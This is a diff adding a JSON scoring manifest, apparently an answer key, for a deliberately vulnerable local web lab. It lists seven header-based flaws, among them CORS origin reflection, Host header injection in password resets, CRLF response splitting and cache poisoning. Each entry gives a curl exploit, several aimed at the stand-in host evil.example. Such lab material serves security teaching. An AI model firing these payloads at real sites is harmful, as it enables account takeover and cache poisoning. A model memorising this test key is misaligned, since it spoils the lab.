@@ -1,0 +1,49 @@
+{
+  "lab": "08-trustedge",
+  "base_url": "http://127.0.0.1:18808",
+  "stack": "python-stdlib web app (trust-boundary / header-driven misconfig)",
+  "vulns": [
+    {
+      "id": "T1", "class": "cors-misconfig", "severity": "high", "route": "/api/account",
+      "desc": "CORS mal configurado: Access-Control-Allow-Origin reflete o header Origin do atacante E Access-Control-Allow-Credentials:true — qualquer site lê dados autenticados da vítima cross-origin.",
+      "exploit": "curl -H 'Origin: https://evil.example' /api/account -> ACAO: https://evil.example + ACAC: true; rouba dados com cookies da vítima.",
+      "points": 1
+    },
+    {
+      "id": "T2", "class": "cors-misconfig", "severity": "medium", "route": "/api/data",
+      "desc": "CORS aceita Origin 'null' (ACAO: null) — bypass via iframe sandbox/documento local com credenciais.",
+      "exploit": "curl -H 'Origin: null' /api/data -> ACAO: null (+ credentials).",
+      "points": 1
+    },
+    {
+      "id": "T3", "class": "host-header-injection", "severity": "critical", "route": "/reset",
+      "desc": "Host header injection: o link de reset de senha é montado com o header Host fornecido na request — atacante envia Host malicioso e a vítima recebe link de reset apontando pro servidor do atacante (account takeover).",
+      "exploit": "curl -H 'Host: evil.example' -d 'user=victim' /reset -> token de reset enviado com link http://evil.example/reset?token=...",
+      "points": 1
+    },
+    {
+      "id": "T4", "class": "host-header-injection", "severity": "high", "route": "/",
+      "desc": "X-Forwarded-Host confiável: a app reflete X-Forwarded-Host em URLs absolutas/redirects sem validar — redirecionamento/poisoning para domínio do atacante.",
+      "exploit": "curl -H 'X-Forwarded-Host: evil.example' / -> URLs/Location apontam pra evil.example.",
+      "points": 1
+    },
+    {
+      "id": "T5", "class": "crlf", "severity": "high", "route": "/redirect",
+      "desc": "CRLF injection / HTTP response splitting: o parâmetro next= é colocado direto no header Location sem sanitizar CR/LF — injeção de headers (Set-Cookie) e splitting.",
+      "exploit": "curl '/redirect?next=/x%0d%0aSet-Cookie:admin=1' -> header Set-Cookie injetado na resposta.",
+      "points": 1
+    },
+    {
+      "id": "T6", "class": "cache-poisoning", "severity": "high", "route": "/",
+      "desc": "Web cache poisoning: header unkeyed X-Forwarded-Host é refletido no corpo (URL canônica/asset) de uma resposta marcada como cacheável (Cache-Control: public) — atacante envenena o cache pra todos os usuários.",
+      "exploit": "curl -H 'X-Forwarded-Host: evil.example' / -> evil.example refletido no HTML + Cache-Control: public (cacheável).",
+      "points": 1
+    },
+    {
+      "id": "T7", "class": "headers", "severity": "low", "route": "/",
+      "desc": "Cabeçalhos de segurança ausentes (sem Content-Security-Policy, X-Content-Type-Options, X-Frame-Options, HSTS) — defesa-em-profundidade ausente.",
+      "exploit": "curl -I / -> nenhum header de segurança presente.",
+      "points": 1
+    }
+  ]
+}
